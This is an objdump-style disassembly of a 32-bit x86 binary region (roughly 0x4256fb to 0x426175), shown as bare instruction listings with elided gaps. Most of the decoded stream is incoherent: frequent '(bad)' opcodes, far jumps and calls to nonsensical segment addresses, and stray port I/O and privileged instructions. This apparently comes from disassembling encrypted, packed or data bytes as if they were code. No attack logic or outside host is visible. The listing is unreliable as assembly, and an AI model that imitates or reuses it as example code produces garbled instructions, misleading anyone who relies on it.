  4256fb:	rcr    DWORD PTR [ebx+0x38],0x11
  4256ff:	xchg   BYTE PTR [ebx],bh
  425701:	push   ds
  425702:	leave  
  425703:	fdivr  DWORD PTR [ecx*4+0x385aaf42]
  42570a:	sub    ch,BYTE PTR [ebx+0x77]
  42570d:	mov    bh,0x1a
  42570f:	call   0x0:0x0
	...
  425772:	add    BYTE PTR [eax],al
  425774:	(bad)  
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x5cfa3574
  425783:	dec    ebp
  425784:	enter  0x18f,0x0
  425788:	add    al,0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	pop    ecx
  42578d:	xchg   ebx,eax
  42578e:	adc    DWORD PTR [ecx+0x622b73bf],eax
  425794:	int3   
  425795:	jmp    0xfd49:0xc4f38c4b
  42579c:	inc    ebx
  42579d:	push   edi
  42579e:	nop
  42579f:	adc    edi,DWORD PTR [ecx+edi*4+0x68aa36]
  4257a6:	sbb    BYTE PTR [edi+0x1a92faab],dh
  4257ac:	mov    ah,0x5
  4257ae:	add    eax,0x58ec28bb
  4257b3:	push   ebp
  4257b4:	or     eax,0x93cbf5e9
  4257b9:	adc    ebx,ecx
  4257bb:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257bd:	sub    ch,BYTE PTR [esi+0x4567979b]
  4257c3:	or     ecx,esp
  4257c5:	shl    BYTE PTR [edx+0x26],cl
  4257c8:	arpl   WORD PTR [edx+edi*4+0x2e02bf4a],cx
  4257cf:	ja     0x42575e
  4257d1:	ins    DWORD PTR es:[edi],dx
  4257d2:	mov    ds:0x81a139a,eax
  4257d7:	call   0x27bf97cf
  4257dc:	mov    esp,DWORD PTR [eax+0x6a]
  4257df:	scas   eax,DWORD PTR es:[edi]
  4257e0:	rcr    DWORD PTR [ebx+ebx*8-0x33a95805],cl
  4257e7:	(bad)  [esi]
  4257e9:	mov    DWORD PTR [esi-0x2ccb71f2],esi
  4257ef:	lods   al,BYTE PTR ds:[esi]
  4257f0:	mov    esp,0x573b8124
  4257f5:	pop    DWORD PTR [edi]
  4257f7:	xlat   BYTE PTR ds:[ebx]
  4257f8:	ins    DWORD PTR es:[edi],dx
  4257f9:	std    
  4257fa:	or     eax,0x26
  4257fd:	lds    edi,FWORD PTR [edi-0x6]
  425800:	pushf  
  425801:	retf   
  425802:	or     BYTE PTR [ebx-0x6490f5f2],al
  425808:	scas   eax,DWORD PTR es:[edi]
  425809:	push   0xc8a1c55f
  42580e:	push   0xb6f9a4a9
  425813:	pop    ds
  425814:	gs mov ebp,0xbe2f339e
  42581a:	cwde   
  42581b:	popa   
  42581c:	mov    dh,0x7
  42581e:	fs xchg edi,eax
  425820:	inc    edx
  425821:	jmp    0x425851
  425823:	enter  0x83b9,0x8c
  425827:	and    ebp,eax
  425829:	arpl   WORD PTR [eax+0x11d18e98],sp
  42582f:	inc    esp
  425830:	mov    ebp,DWORD PTR [edx-0x6d]
  425833:	cwde   
  425834:	aas    
  425835:	shr    DWORD PTR [ebx-0x67],0x54
  425839:	out    0x81,eax
  42583b:	fdivp  st(2),st
  42583d:	lods   al,BYTE PTR ds:[esi]
  42583e:	or     BYTE PTR [edi-0x74dafe6c],cl
  425844:	ficomp WORD PTR [eax]
  425846:	lahf   
  425847:	mov    eax,0x45acc5d3
  42584c:	retf   
  42584d:	imul   edx,DWORD PTR [esi+0x32],0xffffffdf
  425851:	push   eax
  425852:	and    BYTE PTR [edi+0x45],bh
  425855:	pop    edi
  425856:	dec    edx
  425857:	inc    esp
  425858:	adc    BYTE PTR [ebx-0x6ceb6d27],0x12
  42585f:	mov    eax,0xa9f8c73f
  425864:	jnp    0x42583f
  425866:	mov    WORD PTR [ebp+0x1e],es
  425869:	mov    ebx,0xbb5caffd
  42586e:	in     eax,dx
  42586f:	test   al,0x9d
  425871:	aam    0x27
  425873:	cmp    DWORD PTR [ebx],edi
  425875:	sub    al,0x3
  425877:	mov    al,0x17
  425879:	add    dl,BYTE PTR cs:0x69fe704b
  425880:	dec    edi
  425881:	adc    dh,cl
  425883:	push   ecx
  425884:	jae    0x425859
  425886:	into   
  425887:	pop    ds
  425888:	push   ecx
  425889:	push   es
  42588a:	adc    ch,ch
  42588c:	jp     0x4258b6
  42588e:	jge    0x4258c9
	...
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	pop    ecx
  425901:	mov    dl,BYTE PTR [edx+0x190cc94]
  425907:	add    BYTE PTR [ecx+eax*1],al
  42590a:	add    BYTE PTR [eax],al
  42590c:	js     0x4258a5
  42590e:	ja     0x425989
  425910:	ror    ch,0xb6
  425913:	std    
  425914:	mov    BYTE PTR es:[eax-0x59],bl
  425918:	jns    0x42594d
  42591a:	daa    
  42591b:	mov    BYTE PTR [ecx-0x6f1a642c],cl
  425921:	into   
  425922:	jno    0x4258f5
  425924:	aam    0x5e
  425926:	xchg   esp,eax
  425927:	jp     0x425983
  425929:	mov    al,ds:0x616492ef
  42592e:	mov    WORD PTR [ebp-0x1e],fs
  425931:	(bad)  
  425932:	and    al,0x93
  425934:	jo     0x4259a4
  425936:	cdq    
  425937:	test   eax,0x50cf656e
  42593c:	int3   
  42593d:	cli    
  42593e:	sahf   
  42593f:	add    BYTE PTR [eax-0x6480fcca],dl
  425945:	sub    esi,edi
  425947:	(bad)  
  425948:	cli    
  425949:	popf   
  42594a:	iret   
  42594b:	das    
  42594c:	sbb    ah,dh
  42594e:	sub    BYTE PTR [eax],bl
  425950:	popa   
  425951:	push   esp
  425952:	ficom  WORD PTR [ecx]
  425954:	ss (bad) 
  425956:	mov    ebp,0x43ef102f
  42595b:	mov    ch,0xf1
  42595d:	xchg   DWORD PTR [eax+0x4dbfce1a],esi
  425963:	and    ebp,DWORD PTR [eax+0x5a]
  425966:	xor    al,0xc3
  425968:	ja     0x4259e9
  42596a:	or     cl,BYTE PTR [esi+0x3a2d9cfb]
  425970:	sub    ebp,edi
  425972:	jnp    0x425945
  425974:	ret    
  425975:	xchg   ebp,edx
  425977:	xchg   edx,eax
  425978:	repnz gs push ebp
  42597b:	addr16 mov ds:0x9d75,al
  42597f:	push   ecx
  425980:	addr16 xchg esp,eax
  425982:	push   ss
  425983:	mov    dh,0x5c
  425985:	popa   
  425986:	fcmovnb st,st(0)
  425988:	mov    ebp,0x8280225d
  42598d:	fld    DWORD PTR [edx]
  42598f:	sub    dl,bh
  425991:	cwde   
  425992:	jmp    0x9c47:0x51aacdbf
  425999:	mov    ah,0xcf
  42599b:	int    0x87
  42599d:	scas   al,BYTE PTR es:[edi]
  42599e:	icebp  
  42599f:	aam    0x80
  4259a1:	xor    esp,DWORD PTR [edi-0xb]
  4259a4:	dec    ecx
  4259a5:	dec    ebp
  4259a6:	les    esp,FWORD PTR [edi+0x3b]
  4259a9:	add    ch,dl
  4259ab:	mov    eax,ds:0x1e17288e
  4259b0:	clc    
  4259b1:	out    0x3e,al
  4259b3:	loop   0x425974
  4259b5:	bound  ecx,QWORD PTR [esi+eiz*1-0x3771cc00]
  4259bc:	jmp    0x13c6:0x1cd71f71
  4259c3:	adc    al,0x74
  4259c5:	mov    al,0x75
  4259c7:	xchg   edx,eax
  4259c8:	inc    eax
  4259c9:	fadd   DWORD PTR [eax-0x5b]
  4259cc:	and    bh,BYTE PTR [ebx]
  4259ce:	daa    
  4259cf:	mov    cl,0x4d
  4259d1:	fist   DWORD PTR [ebx-0x56b4e74a]
  4259d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259d8:	adc    eax,0x3f6eebf4
  4259dd:	xchg   BYTE PTR [eax-0x6d66e98e],al
  4259e3:	push   ss
  4259e4:	jg     0x425a4e
  4259e6:	jo     0x425a2e
  4259e8:	aad    0x4f
  4259ea:	jecxz  0x4259bf
  4259ec:	and    edi,ebx
  4259ee:	jo     0x425988
  4259f0:	xor    ebp,esp
  4259f2:	lods   eax,DWORD PTR ds:[esi]
  4259f3:	fist   WORD PTR [eax-0x87413ea]
  4259f9:	cmc    
  4259fa:	test   BYTE PTR [edi+0x57461df9],dl
  425a00:	fst    st(3)
  425a02:	dec    edi
  425a03:	cmp    al,0xdc
  425a05:	pop    ds
  425a06:	jno    0x4259fa
  425a08:	es cmp al,0x6e
  425a0b:	pop    eax
  425a0c:	mov    eax,0x2a9d78
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x74aa5e90]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	xchg   ebp,eax
  425a8d:	cdq    
  425a8e:	fnstcw WORD PTR [edi-0x376f2684]
  425a94:	lods   al,BYTE PTR ds:[esi]
  425a95:	(bad)  
  425a97:	cmc    
  425a98:	mov    dl,0x4c
  425a9a:	pop    edi
  425a9b:	test   DWORD PTR [ebp+0x4],eax
  425a9e:	mov    dh,BYTE PTR [esi+0x25]
  425aa1:	jmp    0x425ac0
  425aa3:	inc    ebp
  425aa4:	(bad)  
  425aa5:	arpl   WORD PTR [ecx],bp
  425aa7:	lahf   
  425aa8:	cld    
  425aa9:	data16 mov BYTE PTR [edi+0x48],cl
  425aad:	out    0x31,al
  425aaf:	mov    eax,ds:0xc5063cf
  425ab4:	addr16 das 
  425ab6:	test   eax,esp
  425ab8:	or     ebp,ebx
  425aba:	xchg   edx,ecx
  425abc:	jb     0x425a87
  425abe:	xchg   DWORD PTR [edi-0x11],edi
  425ac1:	repz push ecx
  425ac3:	mov    ebp,0x68256b0d
  425ac8:	(bad)  
  425aca:	mov    bh,0xc4
  425acc:	(bad)  
  425acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ace:	cdq    
  425acf:	ret    0xfea6
  425ad2:	in     eax,0xcf
  425ad4:	and    esi,eax
  425ad6:	daa    
  425ad7:	cwde   
  425ad8:	xor    BYTE PTR [eax+0x19],bl
  425adb:	mov    ch,0xb7
  425add:	mov    ah,0x23
  425adf:	popa   
  425ae0:	pop    edx
  425ae1:	add    DWORD PTR [edi-0x56],edx
  425ae4:	push   0xf2a94739
  425ae9:	adc    DWORD PTR [esi],eax
  425aeb:	xchg   ecx,eax
  425aec:	push   ebp
  425aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425aee:	dec    ebp
  425aef:	mov    ebx,0xe685c4fc
  425af4:	inc    ebx
  425af5:	stos   DWORD PTR es:[edi],eax
  425af6:	imul   esi,DWORD PTR ds:0x93abc4a8,0x1234673e
  425b00:	cmp    DWORD PTR [ebp-0x41],0x88803546
  425b07:	fist   DWORD PTR [ebx]
  425b09:	and    eax,0xc779e36e
  425b0e:	icebp  
  425b0f:	adc    ah,dl
  425b11:	xor    eax,0x1e58d005
  425b16:	mov    cl,0x6d
  425b18:	sbb    DWORD PTR [ecx-0xf],eax
  425b1b:	idiv   BYTE PTR [edx]
  425b1d:	aam    0xd3
  425b1f:	aaa    
  425b20:	and    DWORD PTR [edx-0x1c],ebx
  425b23:	cld    
  425b24:	arpl   WORD PTR [edx-0x7750ebf1],bp
  425b2a:	inc    eax
  425b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b2c:	jne    0x425b5b
  425b2e:	aad    0xb8
  425b30:	xchg   edx,eax
  425b31:	int    0x64
  425b33:	push   edi
  425b34:	adc    BYTE PTR [esi+0x26],ah
  425b37:	iret   
  425b38:	push   ecx
  425b39:	or     eax,DWORD PTR ds:[eax+eiz*4-0x50e96c1e]
  425b41:	or     dl,ch
  425b43:	xchg   ebp,eax
  425b44:	outs   dx,DWORD PTR ds:[esi]
  425b45:	push   ecx
  425b46:	mov    al,0x73
  425b48:	cmp    eax,0xe0c8d0f3
  425b4d:	fwait
  425b4e:	xchg   ecx,eax
  425b4f:	mov    eax,ds:0x27993c2a
  425b54:	out    0xf3,al
  425b56:	mov    edi,0xe16975a8
  425b5b:	fisubr WORD PTR es:[edx+0x46130acd]
  425b62:	lahf   
  425b63:	xchg   esp,eax
  425b64:	jnp    0x425b50
  425b66:	int    0x35
  425b68:	dec    ebx
  425b6a:	(bad)  
  425b6b:	scas   al,BYTE PTR es:[edi]
  425b6c:	push   cs
  425b6d:	jns    0x425beb
  425b6f:	stos   DWORD PTR es:[edi],eax
  425b70:	or     eax,0xb64385a2
  425b75:	inc    ecx
  425b76:	xchg   ebx,eax
  425b77:	ins    DWORD PTR es:[edi],dx
  425b78:	adc    BYTE PTR [esi+ebx*1+0x583fa448],bh
  425b7f:	iret   
  425b80:	stc    
  425b81:	test   DWORD PTR [edi+eiz*2+0x4c23747a],eax
  425b88:	pop    eax
  425b89:	or     eax,esp
  425b8b:	fild   DWORD PTR [eax]
  425b8d:	sbb    BYTE PTR [ebx+edx*2],ch
	...
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	in     eax,0x8a
  425c02:	loope  0x425b91
  425c04:	aam    0x92
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	jns    0x425bd1
  425c0e:	sub    esp,DWORD PTR [ebx+eiz*8+0xb]
  425c12:	pusha  
  425c13:	adc    BYTE PTR [edi],0xf4
  425c16:	je     0x425c0e
  425c18:	or     dl,cl
  425c1a:	loope  0x425c06
  425c1c:	aaa    
  425c1d:	outs   dx,BYTE PTR ds:[esi]
  425c1e:	fldcw  WORD PTR [ebx+0x16]
  425c21:	dec    edx
  425c22:	repz sbb BYTE PTR [ebx-0x6e],0x4c
  425c27:	jmp    0x404c:0x141630a7
  425c2e:	out    0x2d,al
  425c30:	xor    DWORD PTR [esi],esi
  425c32:	mov    al,ds:0x85df9d4b
  425c37:	cli    
  425c38:	arpl   WORD PTR [eax],bp
  425c3a:	cmp    ecx,esp
  425c3c:	gs xchg edx,eax
  425c3e:	pusha  
  425c3f:	repz adc eax,0xc7e1701
  425c45:	rcr    BYTE PTR [edi+ebp*4+0x5e],cl
  425c49:	ins    BYTE PTR es:[edi],dx
  425c4a:	dec    ebp
  425c4b:	push   0x2340c7b0
  425c50:	push   edx
  425c51:	jno    0x425cb8
  425c53:	retf   
  425c54:	es loop 0x425c3c
  425c57:	mov    eax,0x5eb02f07
  425c5c:	retf   
  425c5d:	push   esi
  425c5e:	int    0x86
  425c60:	adc    BYTE PTR [eax-0x71],ch
  425c63:	into   
  425c64:	mov    ecx,0x6ba5ed04
  425c69:	adc    al,BYTE PTR ds:0xe81fa659
  425c6f:	(bad)  
  425c70:	jo     0x425cea
  425c72:	out    0xc9,eax
  425c74:	mov    esp,0x55fe876
  425c79:	lods   eax,DWORD PTR ds:[esi]
  425c7a:	rcl    DWORD PTR [edi],cl
  425c7c:	ja     0x425ce5
  425c7e:	repz jmp 0x989b:0xe6691087
  425c86:	imul   ecx,eax,0xffffff9a
  425c89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c8a:	mov    al,0xb7
  425c8c:	rol    ebx,1
  425c8e:	pop    ss
  425c8f:	inc    ebp
  425c90:	in     al,dx
  425c91:	jle    0x425cf5
  425c93:	fstp   st(0)
  425c95:	mov    cl,0xa9
  425c97:	jne    0x425c91
  425c99:	out    dx,eax
  425c9a:	out    0x36,al
  425c9c:	mov    edi,0x7e1602ef
  425ca1:	and    cl,cl
  425ca3:	sbb    esp,DWORD PTR [ebx]
  425ca5:	push   edx
  425ca6:	arpl   WORD PTR [ebp-0x38],ax
  425ca9:	xor    bl,BYTE PTR [edx+eiz*1-0x99470a6]
  425cb0:	mov    dh,0xcd
  425cb2:	inc    esi
  425cb3:	out    dx,eax
  425cb4:	xor    dh,dh
  425cb6:	test   al,0xb3
  425cb8:	lahf   
  425cb9:	ret    
  425cba:	fld    DWORD PTR [eax]
  425cbc:	sbb    DWORD PTR [ebx+0x7511cc90],esi
  425cc2:	inc    ebx
  425cc3:	(bad)  
  425cc4:	push   cs
  425cc5:	xchg   edx,eax
  425cc6:	enter  0xe845,0x3e
  425cca:	dec    eax
  425ccb:	mov    eax,0x5d6ec03c
  425cd0:	and    BYTE PTR [ebp-0x3f34c35],dh
  425cd6:	sbb    al,0xd9
  425cd8:	jmp    0x6d14f211
  425cdd:	inc    edi
  425cde:	xchg   ebp,eax
  425cdf:	lds    esi,FWORD PTR [eax+0x58]
  425ce2:	mov    WORD PTR [eax+0x5a],?
  425ce5:	xchg   esp,eax
  425ce6:	cdq    
  425ce7:	or     BYTE PTR [ebx+0x782ed261],al
  425ced:	xor    DWORD PTR [esi-0x7c],esp
  425cf0:	pop    ebx
  425cf1:	xchg   BYTE PTR [ebp+ecx*1+0x21],ah
  425cf5:	fld    DWORD PTR [ecx]
  425cf7:	lock ins DWORD PTR es:[edi],dx
  425cf9:	(bad)  
  425cfb:	xor    eax,0x73efc985
  425d00:	sub    al,0xdb
  425d02:	rcl    DWORD PTR [ebp+0x5ebbdb],1
  425d08:	push   0x6
  425d0a:	loope  0x425c8d
  425d0c:	out    0x84,al
  425d0e:	jp     0x425cf7
	...
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xf43b4cb6,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	jns    0x425d85
  425d8e:	nop
  425d8f:	ror    esi,1
  425d91:	inc    edi
  425d92:	scas   al,BYTE PTR es:[edi]
  425d93:	das    
  425d94:	imul   ecx,DWORD PTR [edi],0xffffffa2
  425d97:	or     dl,cl
  425d99:	jmp    0xaf9ff785
  425d9e:	pusha  
  425d9f:	adc    ebx,DWORD PTR [edx]
  425da1:	int    0x2e
  425da3:	das    
  425da4:	dec    edi
  425da5:	dec    edi
  425da6:	mov    ecx,0x1303c37c
  425dab:	sti    
  425dac:	adc    DWORD PTR [esi+0x40089cd9],esi
  425db2:	add    eax,DWORD PTR [ecx-0x5a7f6c0c]
  425db8:	dec    esp
  425db9:	sub    bh,dh
  425dbb:	xchg   DWORD PTR [ebp+0x66],edx
  425dbe:	in     al,0xd0
  425dc0:	mov    eax,ds:0xcc3cddbf
  425dc5:	pusha  
  425dc6:	cmp    al,0xac
  425dc8:	adc    al,0xcd
  425dca:	pop    es
  425dcb:	mov    cl,0x54
  425dcd:	and    BYTE PTR [esi],al
  425dcf:	sub    BYTE PTR [edi],0xac
  425dd2:	outs   dx,BYTE PTR ds:[esi]
  425dd3:	retf   
  425dd4:	ja     0x425e17
  425dd6:	outs   dx,DWORD PTR ds:[esi]
  425dd7:	pop    ds
  425dd8:	data16 sub al,0xb0
  425ddb:	mov    cs,eax
  425ddd:	jmp    0x1181:0xf0564fd6
  425de4:	add    BYTE PTR [esi+0x3b],bl
  425de7:	mov    dh,0x2d
  425de9:	xor    ch,bl
  425deb:	retf   
  425dec:	fxch   st(4)
  425dee:	lahf   
  425def:	pop    ebp
  425df0:	or     eax,0x8f73322b
  425df5:	adc    bl,cl
  425df7:	push   ecx
  425df8:	scas   al,BYTE PTR es:[edi]
  425df9:	in     eax,0x66
  425dfb:	xchg   edi,eax
  425dfc:	stos   BYTE PTR es:[edi],al
  425dfd:	cld    
  425dfe:	je     0x425d89
  425e00:	push   ecx
  425e01:	xor    edx,DWORD PTR [ebx]
  425e03:	push   ebp
  425e04:	sahf   
  425e05:	inc    edi
  425e06:	xchg   esi,eax
  425e07:	mov    ecx,0xa5118595
  425e0c:	imul   DWORD PTR [edx-0x47]
  425e0f:	call   0xa0eb2559
  425e14:	dec    esi
  425e15:	dec    edx
  425e16:	sbb    al,0xc
  425e18:	push   ebx
  425e19:	call   0xb8d:0x99f3c8fc
  425e20:	jns    0x425db1
  425e22:	je     0x425e57
  425e24:	outs   dx,BYTE PTR ds:[esi]
  425e25:	aad    0xeb
  425e27:	or     al,0x8e
  425e29:	test   BYTE PTR [edi+0x13],0x25
  425e2d:	mov    ebp,0x1c9d37c1
  425e32:	repz pop ebp
  425e34:	inc    ebx
  425e35:	xchg   edx,eax
  425e36:	cmp    eax,DWORD PTR [edi-0x42a5c3fb]
  425e3c:	ss daa 
  425e3e:	and    BYTE PTR ds:0x52f5bdb7,ch
  425e44:	aam    0xd4
  425e46:	xor    BYTE PTR [eax+ecx*1],bl
  425e49:	test   al,ah
  425e4b:	dec    sp
  425e4d:	push   es
  425e4e:	jb     0x425e8c
  425e50:	ins    BYTE PTR es:[edi],dx
  425e51:	add    cl,dh
  425e53:	push   cs
  425e54:	inc    ebp
  425e55:	mov    BYTE PTR [esi*1+0x203ab3d1],bh
  425e5c:	pop    ebp
  425e5d:	pop    ebx
  425e5e:	call   0xe24a:0x734fdcf4
  425e65:	jg     0x425ed6
  425e67:	pop    ecx
  425e68:	(bad)  
  425e69:	push   0x45
  425e6b:	icebp  
  425e6c:	sub    ah,BYTE PTR ds:0x8b953660
  425e72:	imul   ecx,DWORD PTR [eax-0xa730c3c],0xa32b86d3
  425e7c:	out    0x48,eax
  425e7e:	mov    cl,0x1d
  425e80:	and    cl,al
  425e82:	outs   dx,BYTE PTR ds:[esi]
  425e83:	or     al,0x89
  425e85:	inc    esp
  425e86:	fimul  DWORD PTR [ecx-0x28649c08]
  425e8c:	jmp    0x425ee3
  425e8e:	lods   eax,DWORD PTR ds:[esi]
  425e8f:	inc    ecx
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	cmc    
  425f01:	jmp    0x425f32
  425f03:	in     eax,0xdc
  425f05:	xchg   esp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    al,0x1
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	(bad)  
  425f0e:	adc    esp,DWORD PTR [edx+edi*2]
  425f11:	jp     0x425ec7
  425f13:	neg    dh
  425f15:	xchg   ecx,eax
  425f16:	ficom  WORD PTR [ebx-0x54115736]
  425f1c:	sub    DWORD PTR [eiz*1-0x1202106b],ecx
  425f23:	pop    ecx
  425f24:	inc    eax
  425f25:	push   esi
  425f26:	push   0xa9e7deac
  425f2b:	(bad)  
  425f2c:	sub    DWORD PTR [esi-0x2c2d00d4],ecx
  425f32:	jb     0x425f76
  425f34:	mov    esp,0x114b4142
  425f39:	shl    BYTE PTR [eax],0x86
  425f3c:	adc    DWORD PTR [ecx+0x1d],ecx
  425f3f:	aas    
  425f40:	mov    cl,0x30
  425f42:	xchg   edx,eax
  425f43:	sbb    esi,0xb9393d89
  425f49:	and    DWORD PTR [ecx-0x32],ecx
  425f4c:	add    edi,DWORD PTR [eax-0x39a6ba1]
  425f52:	jmp    0x425fac
  425f54:	mov    al,BYTE PTR gs:[eax-0x6b]
  425f58:	adc    ecx,0xffffff94
  425f5b:	popa   
  425f5c:	mov    al,BYTE PTR [eax+0x5f958d4a]
  425f62:	pop    eax
  425f63:	add    ebx,DWORD PTR [eax-0x17]
  425f66:	call   DWORD PTR [edx-0x2c8eb003]
  425f6c:	test   bh,0x75
  425f6f:	mov    al,ds:0xef2b1353
  425f74:	leave  
  425f75:	cmp    edx,ebx
  425f77:	cwde   
  425f78:	xor    eax,esi
  425f7a:	xchg   DWORD PTR [edi],edx
  425f7c:	stos   BYTE PTR es:[edi],al
  425f7d:	lods   eax,DWORD PTR ds:[esi]
  425f7e:	pushf  
  425f7f:	in     al,dx
  425f80:	shl    BYTE PTR [eax-0x509fc58d],cl
  425f86:	sub    BYTE PTR [ebx-0x7c],dl
  425f89:	and    cl,BYTE PTR [ebp+0x47]
  425f8c:	popf   
  425f8d:	mov    ch,0xa
  425f8f:	sbb    BYTE PTR [eax+0x17591283],dh
  425f95:	pop    es
  425f96:	jbe    0x42600b
  425f98:	mov    eax,0x2d0bbca
  425f9d:	adc    bl,BYTE PTR [ecx+0x7349ba3e]
  425fa3:	neg    DWORD PTR [ebx]
  425fa5:	or     eax,0x8843e94f
  425faa:	addr16 pop es
  425fac:	stos   DWORD PTR es:[edi],eax
  425fad:	retf   0xcd6e
  425fb0:	xor    al,0x36
  425fb2:	lahf   
  425fb3:	add    al,0xc0
  425fb5:	lahf   
  425fb6:	mov    esp,0x7135f82d
  425fbb:	clc    
  425fbc:	shr    DWORD PTR [eax],0xab
  425fbf:	outs   dx,DWORD PTR ds:[esi]
  425fc0:	push   esi
  425fc1:	dec    eax
  425fc2:	mov    al,0x99
  425fc4:	xchg   ecx,eax
  425fc5:	test   DWORD PTR fs:[eax-0x4b],0xbe798e89
  425fcd:	jo     0x42603c
  425fcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fd0:	enter  0xcdf6,0x9b
  425fd4:	scas   al,BYTE PTR es:[edi]
  425fd5:	cmp    BYTE PTR fs:[ecx+ebx*2+0x6],bh
  425fda:	dec    ecx
  425fdb:	jnp    0x425f9f
  425fdd:	mov    edx,0x183964f0
  425fe2:	inc    DWORD PTR [edx+0x17]
  425fe5:	test   DWORD PTR [edi],edi
  425fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fe8:	lds    ebp,FWORD PTR [eax-0x75]
  425feb:	jmp    0x212a97f5
  425ff0:	dec    ebx
  425ff1:	sub    eax,0x8794ea1b
  425ff6:	and    eax,0x47bce820
  425ffb:	pop    edx
  425ffc:	mov    BYTE PTR [ecx-0x4519467c],cl
  426002:	mov    dl,0xd4
  426004:	popa   
  426005:	pop    eax
  426006:	xchg   ebx,eax
  426007:	jg     0x42607d
  426009:	sbb    BYTE PTR [esi],al
  42600b:	jle    0x426057
  42600d:	(bad)  
  42600e:	cmp    al,0x5f
	...
  426074:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	push   DWORD PTR [eax-0x53]
  426083:	cmp    eax,esp
  426085:	xchg   ebp,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	mov    al,fs:0xb7d4c3b4
  426092:	sbb    cl,BYTE PTR [ebp-0x4bab8771]
  426098:	cmp    dh,BYTE PTR [edx+ebp*4]
  42609b:	pop    ebp
  42609c:	(bad)  
  42609d:	jmp    0x950d:0x84f5eb8
  4260a4:	es test al,0xde
  4260a7:	mov    edx,0xd69f6b06
  4260ac:	leave  
  4260ad:	es dec edx
  4260af:	pop    esi
  4260b0:	loope  0x426042
  4260b2:	test   eax,0xb54419df
  4260b7:	cmp    al,0xcb
  4260b9:	fs cli 
  4260bb:	ins    DWORD PTR es:[edi],dx
  4260bc:	xor    ebx,DWORD PTR [ebx-0x6bec241a]
  4260c2:	in     eax,0x8e
  4260c4:	xor    eax,0xd47d03e1
  4260c9:	mov    bh,0x43
  4260cb:	inc    edx
  4260cc:	jmp    0x426129
  4260ce:	or     eax,0x95b40103
  4260d3:	loopne 0x4260b3
  4260d5:	cmp    eax,0x66234559
  4260da:	mov    cl,0x9
  4260dc:	je     0x4260f2
  4260de:	cmp    cl,BYTE PTR [esp+ebp*1-0x3bfd324f]
  4260e5:	mov    esi,0x8ae59989
  4260ea:	jns    0x42613c
  4260ec:	mov    edi,DWORD PTR [esi+0x4d46019b]
  4260f2:	loop   0x4260ff
  4260f4:	push   eax
  4260f5:	out    0xab,al
  4260f7:	push   ss
  4260f8:	arpl   WORD PTR [edx+0x7d872ebe],bx
  4260fe:	or     eax,0x8f0863eb
  426103:	nop
  426104:	push   cs
  426105:	addr16 xor esp,esp
  426108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426109:	sub    bh,bl
  42610b:	sub    esp,edi
  42610d:	jbe    0x426163
  42610f:	retf   0xfc66
  426112:	xchg   BYTE PTR [edx+0x774a5b60],dl
  426118:	loop   0x4260e0
  42611a:	add    edi,DWORD PTR [esi]
  42611c:	add    eax,0xe9f2a155
  426121:	sbb    edi,DWORD PTR [ecx-0x140d386]
  426127:	sub    al,dh
  426129:	je     0x42615a
  42612b:	xor    esp,ebx
  42612d:	jg     0x42612a
  42612f:	xchg   edx,eax
  426130:	retf   0xae59
  426133:	shl    DWORD PTR [eax-0x63ca8fab],1
  426139:	jmp    0xd10d:0xa8afd01e
  426140:	inc    edi
  426141:	or     esp,ebp
  426143:	mov    ebx,0x4bf41e35
  426148:	lods   al,BYTE PTR ds:[esi]
  426149:	xor    DWORD PTR [ebp+0x3fcabab6],0x56096c24
  426153:	in     al,dx
  426154:	lods   al,BYTE PTR ds:[esi]
  426155:	mov    ds:0xff495d25,eax
  42615a:	(bad)  
  42615b:	push   ebp
  42615c:	sub    eax,0x1783a259
  426161:	mov    WORD PTR [esi+0x4],fs
  426164:	jl     0x4261b2
  426166:	lods   eax,DWORD PTR ds:[esi]
  426167:	adc    DWORD PTR [ebx+eiz*8-0x12],esp
  42616b:	pop    es
  42616c:	out    0xf2,al
  42616e:	or     BYTE PTR [ecx+0x1d],dh
  426171:	dec    ebp
  426172:	stos   DWORD PTR es:[edi],eax
  426173:	push   ss
  426174:	inc    ebx
  426175:	daa    
